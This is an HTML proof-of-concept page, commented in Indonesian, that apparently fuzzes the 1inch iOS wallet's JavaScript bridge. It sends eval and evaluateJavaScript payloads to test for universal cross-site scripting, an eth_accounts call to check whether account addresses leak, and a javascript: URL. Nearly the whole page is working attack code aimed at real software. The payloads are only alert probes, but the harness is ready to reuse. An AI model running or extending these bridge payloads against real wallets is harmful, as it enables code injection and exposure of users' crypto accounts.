<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>Fuzzing 1inch Bridge...</h3>
    <div id="logs"></div>

    <script>
        const target = window.OneInchiOSWallet;
        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;

        if (target) {
            log("Bridge 1inch Terdeteksi!");

            // Daftar format yang sering digunakan oleh bridge dompet iOS
            const payloads = [
                // Format 1: String Eval (Target UXSS utama)
                JSON.stringify({ method: "evaluateJavaScript", args: ["alert('UXSS_1')"] }),
                
                // Format 2: Direct Eval
                JSON.stringify({ type: "eval", code: "alert('UXSS_2')" }),
                
                // Format 3: Request Accounts (Untuk cek kebocoran data alamat)
                JSON.stringify({ method: "eth_accounts", id: 1 }),
                
                // Format 4: Plain string
                "javascript:alert('UXSS_3')"
            ];

            payloads.forEach((p, i) => {
                try {
                    log(`Mencoba Payload #${i+1}...`);
                    target.call(p); // Mencoba menembak bridge
                } catch(e) {
                    log(`Gagal pada #${i+1}: ${e.message}`);
                }
            });
        } else {
            log("Bridge tidak ditemukan. Pastikan dibuka di DApp 1inch.");
        }
    </script>
</body>
</html>
